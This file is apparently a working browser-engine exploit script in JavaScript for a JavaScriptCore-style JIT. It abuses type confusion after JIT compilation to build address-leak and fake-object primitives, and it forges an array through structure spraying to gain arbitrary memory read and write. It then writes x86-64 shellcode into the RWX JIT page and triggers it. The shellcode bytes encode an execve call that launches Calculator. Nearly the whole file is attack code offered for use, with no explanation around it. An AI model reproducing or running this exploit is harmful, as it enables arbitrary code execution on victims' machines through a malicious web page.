const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(val)
{ 
    f64[0] = val;
    let tmp = Array.from(u32);
    return tmp[1] * 0x100000000 + tmp[0];
}
// 64-bit unsigned integer to Floating point
function i2f(val)
{
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}

// 64-bit unsigned integer to jsValue
function i2obj(val)
{
    return i2f(val-0x01000000000000);
}

// 64-bit unsigned integer to hex
function hex(i)
{
    return "0x"+i.toString(16).padStart(16, "0");
}

function make_jit_compiled_function() {
    // Some code to avoid inlining...
    function target(num) {
        for (var i = 2; i < num; i++) {
            if (num % i === 0) {
                return false;
            }
        }
        return true;
    }

    // Force JIT compilation.
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }

    return target;
}

var structure_spray = [];
// spray the structure id
function spray_structure() {
    for(let i=0; i<0x1000; i++) {
        arr = [13.37, 14.47, 15.57];
        arr['prop'] = 13.37;
        arr['prop_'+i] = 13.37;
        structure_spray.push(arr);
    }
}


spray_structure();

// addr_of_arr[0] = {};
function addr_of(obj) {

    let arr = [1.1, 2.2];
    arr.out_prop = 3.3;

    function foo() {
        return arr[0];
    }

    for(let i=0; i<100000; i++) {
        foo();
    }
    
    delete arr.out_prop;

    arr[0] = obj;
    
    return f2i(foo());
}

function fake_obj(addr) {

    addr = i2f(addr);
    let arr = [1.1, 2.2];
    arr.out_prop = 3.3;

    function foo() {
        arr[0] = addr;
    }

    for(let i=0; i<100000; i++) {
        foo();
    }

    // readline();
    delete arr.out_prop;

    arr[1] = {};
   
    foo();

    return arr[0];
}
// var bb = [1.1, 2.2];
// print(describe(bb));
// var addr = addr_of(bb);
// print(hex(addr));
// print(describe(fake_obj(i2f(addr))));

// spray_structure();
// victim to do all the primitives
var victim = structure_spray[Math.floor(Math.random() * structure_spray.length)];

// ArrayWithDouble cell
var double_cell_header = 0x0108200700000200;
// 0x00, 0x02, 0x00, 0x00,                // m_structureID (0x00000200)
// 0x7,                                   // m_indexingTypeAndMisc (ArrayWithDouble)
// 0x20,                                  // m_type (ArrayType)gu
// 0x8,                                   // m_flags (OverridesGetOwnPropertySlot)
// 0x1                                    // m_cellState (DefinitelyWhite)

// ArrayWithContiguous cell
var contiguous_cell_header = 0x0108200900000200;
// 0x00, 0x02, 0x00, 0x00,                // m_structureID (0x00000200)
// 0x9,                                   // m_indexingTypeAndMisc (ArrayWithContiguous)
// 0x20,                                  // m_type (ArrayType)
// 0x8,                                   // m_flags (OverridesGetOwnPropertySlot)
// 0x1                                    // m_cellState (DefinitelyWhite)

// container to store fake driver object
var container = {
    cell_header: i2obj(contiguous_cell_header),
    butterfly: victim   
};

var container_addr = addr_of(container);
// print(hex(container_addr));
// print(describe(container));
var fake_arr_addr = container_addr + 0x10;
print("[+] fake driver object addr: "+hex(fake_arr_addr));
var driver = fake_obj(fake_arr_addr);
// print(describe(driver));
while (!(driver instanceof Array)) {
    double_cell_header += 4;
    contiguous_cell_header +=4;
    container.cell_header = i2obj(contiguous_cell_header);      
}

// ArrayWithContiguous
var boxed = [{}];

// ArrayWithDouble
var unboxed = [13.37, 13.37];

driver[1] = unboxed;
// print(dscribe(driver));

// print(describe(unboxed));
var shared_butterfly = f2i(victim[1]);
print("[+] shared butterfly addr: " + hex(shared_butterfly));

//print(describe(unboxed));
driver[1] = boxed;
victim[1] = i2f(shared_butterfly);

container.cell_header = i2f(double_cell_header-0x01000000000000);

// get all the primitives
primitives = {
    addr_of: function(obj) {
        boxed[0] = obj;
        return f2i(unboxed[0]);
    },

    fake_obj: function(addr) {
        unboxed[0] = i2f(addr);
        return boxed[0];            
    },

    read64: function(addr) {
        driver[1] = i2f(addr+0x10);
		return this.addr_of(victim.prop);
		// return f2i(victim.prop);
    },
    write64: function(addr, val) {
        driver[1] = i2f(addr+0x10);
        // victim.prop = this.fake_obj(val);
        victim.prop = i2f(val);
    }

}

// get jit jit function first;
var jit_func = make_jit_compiled_function();
// get the addr with addr_of primitive;
var jit_func_addr = primitives.addr_of(jit_func);
// get the executable base addr;
var executable_base_addr = primitives.read64(jit_func_addr + 0x18);
// get the jit code object addr;
var jit_code_addr = primitives.read64(executable_base_addr + 0x18);
// finally get the rwx addr;
var rwx_addr = primitives.read64(jit_code_addr + 32);

print("[+] jit function addr: "+hex(jit_func_addr));
print("[+] executable base addr: "+hex(executable_base_addr));
print("[+] jit code addr: "+hex(jit_code_addr));
print("[+] rwx addr: "+hex(rwx_addr));

function byte_to_dword_array(payload)
{

    let sc = []
    let tmp = 0;
    let len = Math.ceil(payload.length/6)
    for (let i = 0; i < len; i += 1) {
        tmp = 0;
        pow = 1;
        for(let j=0; j<6; j++){
            let c = payload[i*6+j]
            if(c === undefined) {
                c = 0;
            }
            pow = j==0 ? 1 : 256 * pow;
            tmp += c * pow;
        }
        tmp += 0xc000000000000;
        sc.push(tmp);
    }
    return sc;
}

function arbitrary_write(addr, payload) 
{
    let sc = byte_to_dword_array(payload);
    for(let i=0; i<sc.length; i++) {
        // primitives.write64(addr+i*6, 0xcccccccccccccccc);
        primitives.write64(addr+i*6, sc[i]);
    }
}

var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
    96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
    105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
    72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
    72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
    184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
    94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];

var shellcode = [0x6a, 0x3b, 0x58, 0x99, 0x0f, 0xba, 0xe8, 0x19, 0x48, 0xbb, 
	0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x52, 0x53, 0x54, 0x5f, 
	0x52, 0x66, 0x68, 0x2d, 0x63, 0x54, 0x5b, 0x52, 0xeb, 0x06, 0x53, 0x57, 
	0x54, 0x5e, 0x0f, 0x05, 0xe8, 0xf5, 0xff, 0xff, 0xff, 0x2f, 0x53, 0x79, 
	0x73, 0x74, 0x65, 0x6d, 0x2f, 0x41, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 
	0x74, 0x69, 0x6f, 0x6e, 0x73, 0x2f, 0x43, 0x61, 0x6c, 0x63, 0x75, 0x6c, 
	0x61, 0x74, 0x6f, 0x72, 0x2e, 0x61, 0x70, 0x70, 0x2f, 0x43, 0x6f, 0x6e,
	0x74, 0x65, 0x6e, 0x74, 0x73, 0x2f, 0x4d, 0x61, 0x63, 0x4f, 0x53, 0x2f, 
	0x43, 0x61, 0x6c, 0x63, 0x75, 0x6c, 0x61, 0x74, 0x6f, 0x72, 0x0];

// primitives.write64(rwx_addr, 0xcccccccccccccccc);
// write shellcode to rwx addr
arbitrary_write(rwx_addr, shellcode);
print("[+] trigger shellcode");

// trigger shellcode
jit_func();
